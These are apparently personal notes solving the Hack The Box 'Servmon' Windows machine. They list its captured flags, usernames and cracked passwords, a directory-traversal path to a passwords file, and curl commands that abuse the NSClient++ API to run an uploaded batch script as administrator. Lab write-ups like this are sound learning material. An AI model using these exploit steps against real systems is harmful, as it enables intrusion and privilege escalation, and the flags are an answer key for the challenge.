# Basic:

```
* Name: Servmon
* IP: 10.10.10.184
* Level: Easy
* Box: Windows
* Release: 11 Apr 2020
```
# Flags
```
User: 38f2ddac2209b111ab1e7ab50cfed900
Root: 13ee495ad015d2bea1bc4f487a4c70e7
```

#Usernames:
```
Nadine
Nathan
```
# Creds
```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
# NSCLIENT
```
ew2x6SsGTxjRwXOT
```
# Working logins
```
ftp- anonymous
ssh- nadine:L1k3B1gBut7s@W0rk
```
# Nmap Scan:

```
## Ports
* 21 
* 139
* 80: Directory traversal exploit found
* 22
* 445
* 135
* 5666
* 8443
* 6699

```


# FTP

```
* Anonymous login allowed
* Found todo.txt in Nathan directory
* Found confidential.txt in Nadine directory
```
# Exploit

```
/../../../../../../../../../../../../../Users/Nadine/Desktop/Passwords.txt

```
# NsClient exploit
```
* I did it using api
* curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/test.bat --data-binary "start C:\Temp\evil.bat"
  ** evil.bat::
  @echo off
  type C:\Users\Administrator\Desktop\root.txt
* curl -s -k -u admin https://localhost:8443/api/v1/queries/test/commands/execute?time=1m
```
